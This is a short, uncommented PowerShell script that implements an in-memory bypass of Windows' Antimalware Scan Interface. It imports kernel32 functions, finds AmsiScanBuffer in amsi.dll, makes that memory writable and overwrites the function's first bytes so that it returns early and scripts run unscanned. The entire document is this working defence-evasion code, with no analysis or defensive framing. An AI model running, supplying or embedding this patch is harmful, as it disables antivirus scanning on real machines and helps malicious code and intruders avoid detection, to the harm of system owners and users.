$MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru

$handle = $Kernel32::GetModuleHandle("amsi.dll")
$address = $Kernel32::GetProcAddress($handle, "AmsiScanBuffer")
$oldProtection = 0
$Kernel32::VirtualProtect($address, [uint32]5, 0x40, [ref]$oldProtection)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $address, 6)
